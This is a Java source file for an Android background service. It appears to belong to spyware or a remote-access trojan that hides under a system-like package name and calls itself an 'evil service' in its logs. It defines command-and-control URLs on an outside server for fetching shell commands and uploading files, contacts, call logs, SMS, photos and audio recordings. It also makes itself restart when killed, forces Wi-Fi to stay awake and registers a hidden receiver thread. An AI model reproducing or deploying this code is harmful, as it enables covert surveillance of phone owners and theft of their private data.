package oom.android.system.app;

import android.annotation.SuppressLint;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.StatFs;
import android.util.Log;

import androidx.annotation.Nullable;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import oom.android.system.Managers.audioManager;

public class MyService extends Service {

    static Context context;
    static Integer App_Version = 1;

    public final static String LOG_TAG = "myLogs";
    static String log_path;//полный путь до папки logs

    final static String site = "http://www.test1.ru/";
    final static String Devices = site+"/Devices/"+DeviceID()+"/";

    final static String filelist_url = Devices +"getlist.php";//возращает список файлов на сервере
    final static String uploader_url = Devices +"up.php";//для загрузки файлов на сервер
    final static String cmd_url = Devices +"getc.php";//возращает команду из файла c.txt
    public final static String post_url = Devices +"output.php";//файл output или же status
    final static String online_url = Devices +"online.php";//сообщает о онлайне
    final static String shelltime_url = Devices +"time.php";//время использования комманды на сервере
    final static String CheckDevice = site +"CheckDevice.php";//время использования комманды на сервере
    final static String out_contacts = Devices +"info/Contacts/setconlist.php";
    final static String out_call = Devices +"info/Calls/setCalllist.php";
    final static String out_sms = Devices +"info/Sms/setsmslist.php";
    final static String out_block = Devices +"info/Block/setBlocklist.php";
    final static String out_fm = Devices +"info/FileManager/setFlist.php";

    public final static String output_img = Devices+"Photo/" +"oimg.php";

    public final static String output_audio = Devices+"Audio/" +"oaudio.php";

    static Integer userid=1;//default 1
    static String DevName="";
    static boolean admin=false;//default false
    static String fname;   // for recorder

    static boolean recording=false;//Запись диктофона
    static boolean record_must_be_stopped = false;//Запись может быть остановленна
    public static MediaRecorder recorder;
    static boolean cmdsessionactive=false;//активирован ли поток шелла
    static HandlerThread waiterthread;//поток для hiddenwaiter
    public static int battery_level=0,battery_status=0,charge_type=0;
    static boolean syncactive = false;//режим синхронизации

    static boolean ScreenOn = false;//режим включенного экрана

    public static DevicePolicyManager devicePolicyManager;
    public static ComponentName demoDeviceAdmin;

    public static Context getContext(){
        return context;
    }

    public void onCreate() {
        Log.d(LOG_TAG, "evil service OnCreate() started!");
        init();
        startwaiter();
        //Intent i = new Intent(String.valueOf(MyService.class));
        //devicePolicyManager.enableSystemApp(demoDeviceAdmin,i);


    }

    @SuppressLint({"MissingPermission", "HardwareIds"})
    public static String DeviceID() {
        String devicIMEI;


       /* TelephonyManager telephonyManager = (TelephonyManager)MainActivity.activity.getSystemService(Context.TELEPHONY_SERVICE);

        devicIMEI = telephonyManager.getDeviceId();*/
       devicIMEI = Build.ID+ String.valueOf(VERSION.SDK_INT);

       return devicIMEI;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("");
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        context = this;
        Log.d(LOG_TAG, "evil service onStartCommand() started!!");
        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        demoDeviceAdmin = new ComponentName(this, DemoDeviceAdminReceiver.class);
        return Service.START_STICKY;
    }

    public void onDestroy() {
        Log.d(LOG_TAG, "Злой сервис убит");
        Log.d(LOG_TAG, "Блин, перезапуск !! : D");
        sendBroadcast(new Intent("oom.android.system.restart"));  //сделает не убиваемым если система выключается
        //stopwaiter();
    }

    @Override
    public void onStart(Intent intent, int startId) {
        Log.d(LOG_TAG, "evil service OnStart() started!");
    }

    void init(){
        try{
            changewifipolicy();
            log_path=getApplicationContext().getFilesDir().getAbsolutePath()+"/logs";
            if(freespace()[0]<5L){  // 5 МБ свободного места минимум в порядке
                Log.d(LOG_TAG, "слишком мало места, отключение рекордера");
                disable_recorder();
            }
        }
        catch(Exception e){
            Log.d(LOG_TAG, "error in initialisation");
        }
    }

    void disable_recorder(){
        try{
            ComponentName component = new ComponentName(getApplicationContext(), audioManager.class);
            getPackageManager().setComponentEnabledSetting(component,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            Log.d(LOG_TAG, "recorder was disabled");
        }
        catch (Exception e){}
    }
    @SuppressWarnings("deprecation")
    @SuppressLint("NewApi")
    static long[] freespace(){
        StatFs statFs = new StatFs(Environment.getDataDirectory().getAbsolutePath());
        StatFs statFs2 = new StatFs(Environment.getExternalStorageDirectory().getAbsolutePath());
        long   data_free;
        long   ext_free;
        if(Integer.valueOf(VERSION.SDK_INT)>=18){
            data_free   = (statFs.getAvailableBlocksLong() * statFs.getBlockSizeLong())/1024/1024;
            ext_free   = (statFs2.getAvailableBlocksLong() * statFs2.getBlockSizeLong())/1024/1024;}
        else{
            data_free   = (statFs.getAvailableBlocks() * statFs.getBlockSize())/1024/1024;
            ext_free   = (statFs2.getAvailableBlocks() * statFs2.getBlockSize())/1024/1024;
        }

        Log.d(MyService.LOG_TAG, "data: "+data_free+" MB");
        //Log.d(LOG_TAG, "external: "+ext_free+" MB");
        return new long[] {data_free, ext_free};

    }

    @SuppressWarnings("deprecation")
    @SuppressLint("NewApi")
    void changewifipolicy(){

        //getsize();
        try{
            int mode;
            ContentResolver cr = getContentResolver();
            if(Integer.valueOf(VERSION.SDK_INT)>=17){
                mode = android.provider.Settings.Global.getInt(cr, android.provider.Settings.Global.WIFI_SLEEP_POLICY,
                        android.provider.Settings.Global.WIFI_SLEEP_POLICY_NEVER);
                if(mode!=2){ // меняем политику на never sleep   (SYSTEM ONLY!!)
                    android.provider.Settings.Global.putInt(cr, android.provider.Settings.Global.WIFI_SLEEP_POLICY,
                            android.provider.Settings.Global.WIFI_SLEEP_POLICY_NEVER);
                    //Log.d(LOG_TAG, "wifi policy successfully changed!");

                }
            } else{
                mode = android.provider.Settings.System.getInt(cr, android.provider.Settings.System.WIFI_SLEEP_POLICY,
                        android.provider.Settings.System.WIFI_SLEEP_POLICY_NEVER);
                if(mode!=2){
                    android.provider.Settings.System.putInt(cr, android.provider.Settings.System.WIFI_SLEEP_POLICY,
                            android.provider.Settings.System.WIFI_SLEEP_POLICY_NEVER);
                    //Log.d(LOG_TAG, "wifi policy successfully changed!");
                }
            }
        }
        catch(Exception e){
            //Log.d(LOG_TAG, "cant change wifi sleep policy! not system\n");
        }


    }

    void startwaiter(){
        HiddenWaiter evilreceiver = new HiddenWaiter();
        //Log.d(LOG_TAG, "trying to start hidden waiter thread..");
        try{
            waiterthread = new HandlerThread("hiddenwaiterthread");
            waiterthread.start();
            Looper customlooper = waiterthread.getLooper();
            Handler waiterhandler = new Handler(customlooper);
            IntentFilter myfilter = new IntentFilter();
            myfilter.addAction("android.intent.action.TIME_SET");
            //myfilter.addAction("android.intent.action.SCREEN_ON");
            //myfilter.addAction("android.intent.action.SCREEN_OFF");

            try{
                registerReceiver(evilreceiver, myfilter,null,waiterhandler);
            }
            catch(ExceptionInInitializerError e){
                unregisterReceiver(evilreceiver);
            }
        }
        catch(Exception e){

        }

    }

    void stopwaiter(){
        //Intent intent = new Intent();
        //intent.setAction("stopmyreciever");
        //sendBroadcast(intent);
        HiddenWaiter evilreceiver = new HiddenWaiter();
        unregisterReceiver(evilreceiver);
        waiterthread.quit();
        //Log.d(LOG_TAG, "waiter reciever убит!");
    }

    public static File OpenFile(int type){
        File dir = new File(MainActivity.context.getApplicationInfo().dataDir+"/files/logs");
        dir.mkdirs();

        SimpleDateFormat dateFormat = new SimpleDateFormat("dd_mm_yyyy_hh_mm_ss",
                Locale.getDefault());
        String ffile;
        if(type==1)//record
            ffile= "record_" + dateFormat.format(new Date()) +MyService.fname+ ".mpeg4";
        else if(type==2)//video
            ffile= "video_" + dateFormat.format(new Date()) + ".mp4";
        else if(type==3)//picture
            ffile= "photo_" + dateFormat.format(new Date()) + ".jpg";
        else
            ffile= "screenshot_" + dateFormat.format(new Date()) + ".png";
        String filename = dir.getPath() + File.separator + ffile;
        File file = new File(filename);
        return file;
    }
}
